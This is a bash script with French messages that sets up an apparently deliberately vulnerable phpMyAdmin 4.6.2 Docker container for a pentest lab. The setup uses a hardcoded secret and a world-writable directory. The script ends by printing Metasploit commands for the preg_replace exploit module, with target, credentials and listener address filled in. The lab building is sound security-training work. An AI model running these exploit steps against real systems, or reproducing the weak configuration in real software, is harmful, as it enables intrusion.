#!/bin/bash
set -e

echo "=========================================="
echo "  phpMyAdmin 4.6.2 - Installation FINALE"
echo "=========================================="
echo ""

if [ "$EUID" -ne 0 ]; then 
    echo "❌ Lance avec sudo"
    exit 1
fi

WORKDIR="/tmp/phpmyadmin-build-$$"
mkdir -p "$WORKDIR"
cd "$WORKDIR"

echo "[1/4] Création Dockerfile optimisé..."
cat > Dockerfile << 'EOF'
FROM php:7.4-apache

# Installer extensions PHP (sans apt-get update)
RUN docker-php-ext-install mysqli

# Télécharger phpMyAdmin directement
WORKDIR /var/www/html
ADD https://files.phpmyadmin.net/phpMyAdmin/4.6.2/phpMyAdmin-4.6.2-all-languages.tar.gz /tmp/pma.tar.gz
RUN tar xzf /tmp/pma.tar.gz --strip-components=1 && rm /tmp/pma.tar.gz

# Configuration
RUN cp config.sample.inc.php config.inc.php \
    && sed -i "s/\$cfg\['blowfish_secret'\] = '';/\$cfg['blowfish_secret'] = 'iron4software123456789012345678901234';/" config.inc.php \
    && mkdir -p tmp && chmod 777 tmp \
    && chown -R www-data:www-data /var/www/html

EXPOSE 80
CMD ["apache2-foreground"]
EOF

echo "[2/4] Nettoyage..."
docker stop phpmyadmin-vuln 2>/dev/null || true
docker rm phpmyadmin-vuln 2>/dev/null || true

echo "[3/4] Build (patience 2 min)..."
docker build -t pma:4.6.2 . || {
    echo "❌ Build failed"
    exit 1
}

echo "[4/4] Démarrage..."
docker run -d \
    --name phpmyadmin-vuln \
    --add-host=host.docker.internal:host-gateway \
    -p 8080:80 \
    pma:4.6.2

sleep 15
cd /
rm -rf "$WORKDIR"

IP=$(hostname -I | awk '{print $1}')

echo ""
echo "=========================================="
echo "  ✅ PRÊT !"
echo "=========================================="
docker ps | grep phpmyadmin
echo ""
echo "URL: http://${IP}:8080/"
curl -I http://localhost:8080/ 2>/dev/null | head -3
echo ""
echo "METASPLOIT (depuis Kali):"
echo ""
echo "use exploit/multi/http/phpmyadmin_preg_replace"
echo "set RHOSTS ${IP}"
echo "set RPORT 8080"
echo "set USERNAME root"
echo "set PASSWORD rootpass"
echo "set LHOST 192.168.100.10"
echo "exploit"
echo ""
